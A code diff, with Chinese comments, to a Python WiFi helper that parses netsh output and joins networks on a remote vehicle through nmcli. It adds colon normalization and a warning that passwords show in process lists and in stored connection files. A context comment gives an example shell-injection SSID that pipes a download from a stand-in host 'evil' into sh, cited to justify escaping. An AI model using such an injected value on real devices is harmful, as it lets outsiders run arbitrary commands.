@@ -110,6 +110,10 @@ def parse_netsh_output(out: str) -> tuple:
         s = line.strip()
         if not s:
             continue
+        # 全角冒号归一化：某些系统/输入法会输出「状态：已连接」。
+        # 不归一化的话会静默判成「未连接」—— 和刚修掉的那个 bug
+        # 是同一种失败形态，成本极低就一并处理。
+        s = s.replace("\uff1a", ":")
         # 用 split(":", 1)：SSID 本身可以含冒号（合法），
         # partition 会在第一个冒号处切，值仍然完整，但显式写更清楚。
         parts = s.split(":", 1)
@@ -314,6 +318,10 @@ def join_wireless(remote: Remote, ssid: str, password: str,
     #     都能把自己的名字设成 `X'; curl evil|sh; '`
     #   · password 是用户手输，随手一个含单引号的密码就触发
     # 不转义就等于允许外部输入在车上执行任意命令（以 sunrise 身份）。
+    # 注意：密码虽然已做 shell 转义（防注入），但仍以命令行参数传给
+    # nmcli，因此在车上的 `ps aux` 里能看到明文，直到 nmcli 退出；
+    # NetworkManager 也会把它明文存进 system-connections/<SSID>。
+    # 这不是新增漏洞，但**不要在共用车上使用重要的 WiFi 密码**。
     q_ssid = _shquote(ssid)
 
     # 已有同名连接就直接 up 它，避免重复创建
